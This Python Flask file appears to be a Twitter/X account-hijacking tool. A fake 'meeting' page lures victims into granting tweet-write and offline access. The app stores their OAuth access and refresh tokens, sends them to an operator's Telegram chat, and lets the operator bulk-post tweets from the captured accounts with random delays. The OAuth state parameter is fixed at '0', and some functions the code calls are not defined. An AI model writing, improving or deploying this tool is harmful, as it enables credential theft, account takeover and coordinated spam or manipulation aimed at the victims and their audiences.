import base64
import hashlib
import os
import sqlite3  # For database storage
import requests
import random  # For random delays in bulk posting
import time  # For adding delays between posts
from flask import Flask, redirect, request, session, render_template, jsonify

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize SQLite database
DATABASE = 'tokens.db'

# Store the command for confirmation
pending_command = {}

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            access_token TEXT NOT NULL,
            refresh_token TEXT,
            username TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

init_db()  # Ensure the database is initialized when the app starts

# Store token in the database
def store_token(access_token, refresh_token, username):
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO tokens (access_token, refresh_token, username)
            VALUES (?, ?, ?)
        ''', (access_token, refresh_token, username))
        conn.commit()
    except Exception as e:
        print(f"Error storing token: {str(e)}")
    finally:
        conn.close()

# Get all tokens from the database
def get_all_tokens():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT access_token, refresh_token, username FROM tokens')
    tokens = cursor.fetchall()
    conn.close()
    return tokens

# Get total token count from the database
def get_total_tokens():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM tokens')
    total = cursor.fetchone()[0]
    conn.close()
    return total

# Refresh a token using refresh_token and notify via Telegram
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    
    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    try:
        response = requests.post(token_url, headers=headers, data=data)
        token_response = response.json()

        if response.status_code == 200:
            new_access_token = token_response.get('access_token')
            new_refresh_token = token_response.get('refresh_token')
            
            # Update the token in the database
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute('UPDATE tokens SET access_token = ?, refresh_token = ? WHERE username = ?', 
                           (new_access_token, new_refresh_token, username))
            conn.commit()
            conn.close()
            
            # Notify via Telegram
            send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
            return new_access_token, new_refresh_token
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {error_description}")
            return None, None

    except Exception as e:
        send_message_via_telegram(f"❌ Error refreshing token for @{username}: {str(e)}")
        return None, None

# Send message via Telegram
def send_message_via_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=data)
    except Exception as e:
        print(f"Error sending message to Telegram: {str(e)}")

# Confirm action based on pending command
def confirm_action():
    global pending_command
    if 'command' in pending_command and pending_command['command']:
        command_to_run = pending_command['command']
        command_text = pending_command.get('text', '')

        # Execute the stored command
        if command_to_run == 'refresh_single':
            handle_refresh_single()
        elif command_to_run == 'refresh_bulk':
            handle_refresh_bulk()
        elif command_to_run == 'post_single':
            handle_post_single(command_text)
        elif command_to_run == 'post_bulk':
            handle_post_bulk(command_text)
        
        # Clear pending command after execution to avoid repeats
        send_message_via_telegram(f"✅ {command_to_run} successfully executed.")
        pending_command.clear()
    else:
        send_message_via_telegram("❌ No pending command to confirm.")

# Handle posting a tweet with a single token
def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        usernames = [token[2] for token in tokens]  # Fetch usernames from tokens
        send_message_via_telegram(f"👤 Available Accounts: {', '.join(usernames)}\nReply with the username to use:")

        selected_username = wait_for_user_input()  # Wait for user's reply with the selected username
        for token in tokens:
            access_token, _, username = token
            if username == selected_username:
                result = post_tweet(access_token, tweet_text)
                send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
                return
        send_message_via_telegram("❌ Username not found in available accounts.")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

# Handle bulk posting tweets with all tokens
def handle_post_bulk(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        total_tokens = len(tokens)
        send_message_via_telegram(f"🔢 Total Tokens Stored: {total_tokens}\nHow many tokens would you like to use?")
        
        num_tokens = int(wait_for_user_input())  # Wait for user's input on how many tokens to use
        send_message_via_telegram("⏳ Please enter the range for random delays between posts (e.g., '5-10' seconds):")
        delay_range = wait_for_user_input().split('-')  # e.g., '5-10'
        min_delay, max_delay = int(delay_range[0]), int(delay_range[1])

        for i in range(min(num_tokens, total_tokens)):
            access_token, _, username = tokens[i]
            result = post_tweet(access_token, tweet_text)
            send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
            delay = random.randint(min_delay, max_delay)
            time.sleep(delay)

        send_message_via_telegram(f"✅ Bulk tweet posting complete. {num_tokens} tweets posted.")
    else:
        send_message_via_telegram("❌ No tokens found to post tweets.")

# Telegram bot webhook to listen for commands
@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    global pending_command

    update = request.json
    message = update.get('message', {}).get('text', '')

    send_message_via_telegram(f"🔔 Command received: {message}")

    if message == '/refresh_single':
        pending_command = {'command': 'refresh_single'}
        send_message_via_telegram("⚠️ You are about to refresh a single token. Type 'confirm' to proceed.")
    elif message == '/refresh_bulk':
        pending_command = {'command': 'refresh_bulk'}
        send_message_via_telegram("⚠️ You are about to refresh all tokens. Type 'confirm' to proceed.")
    elif message.startswith('/post_single'):
        tweet_text = message.replace('/post_single', '').strip()
        if tweet_text:
            pending_command = {'command': 'post_single', 'text': tweet_text}
            send_message_via_telegram(f"⚠️ You are about to post a tweet with a single token. Tweet text: {tweet_text}\nType 'confirm' to proceed.")
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message.startswith('/post_bulk'):
        tweet_text = message.replace('/post_bulk', '').strip()
        if tweet_text:
            pending_command = {'command': 'post_bulk', 'text': tweet_text}
            send_message_via_telegram(f"⚠️ You are about to post tweets in bulk. Tweet text: {tweet_text}\nType 'confirm' to proceed.")
        else:
            send_message_via_telegram("❌ Please provide tweet content.")
    elif message == 'confirm':
        send_message_via_telegram("⚡ Confirming action...")  # Corrected the response message
        confirm_action()
    else:
        send_message_via_telegram("❌ Unknown command. Use /refresh_single, /refresh_bulk, /post_single <tweet>, /post_bulk <tweet>, or confirm to proceed.")

    return '', 200

# --- OAuth Flow for Authorization ---
@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"  # Fixed state
        session['oauth_state'] = state

        try:
            code_verifier, code_challenge = generate_code_verifier_and_challenge()
            session['code_verifier'] = code_verifier  # Store code_verifier in session

            authorization_url = (
                f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
                f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
                f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
            )
            return redirect(authorization_url)
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":  # Fixed state value check
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        try:
            response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
            token_response = response.json()

            if response.status_code == 200:
                access_token = token_response.get('access_token')
                refresh_token = token_response.get('refresh_token')

                session['access_token'] = access_token
                session['refresh_token'] = refresh_token

                # Notify via Telegram and store tokens
                username = get_twitter_username(access_token)
                if username:
                    store_token(access_token, refresh_token, username)
                    send_message_via_telegram(f"New authorization received for @{username}.")
                else:
                    send_message_via_telegram(f"New authorization received but username could not be fetched.")

                return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
            else:
                error_description = token_response.get('error_description', 'Unknown error')
                error_code = token_response.get('error', 'No error code')
                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

        except Exception as e:
            return jsonify({"error": str(e)}), 500

# --- Meeting Page Route ---
@app.route('/j')
def meeting():
    meeting = request.args.get('meeting')
    pwd = request.args.get('pwd')
    return render_template('meeting.html', meeting=meeting, pwd=pwd)

# --- Refresh Token Route ---
@app.route('/refresh/<refresh_token2>', methods=['GET'])
def refresh_page(refresh_token2):
    return render_template('refresh.html', refresh_token=refresh_token2)

# --- Generate code verifier and challenge ---
def generate_code_verifier_and_challenge():
    try:
        code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
        code_challenge = base64.urlsafe_b64encode(
            hashlib.sha256(code_verifier.encode()).digest()
        ).rstrip(b'=').decode('utf-8')
        return code_verifier, code_challenge
    except Exception as e:
        print(f"Error generating code verifier and challenge: {str(e)}")
        raise e

# --- Startup message ---
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    
    # Generate the OAuth link
    authorization_url = CALLBACK_URL

    # Generate the meeting link
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
    
    # Message content
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    
    # Send the message to Telegram
    send_message_via_telegram(message)

# --- Start the app ---
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth and meeting links
    app.run(host='0.0.0.0', port=port)
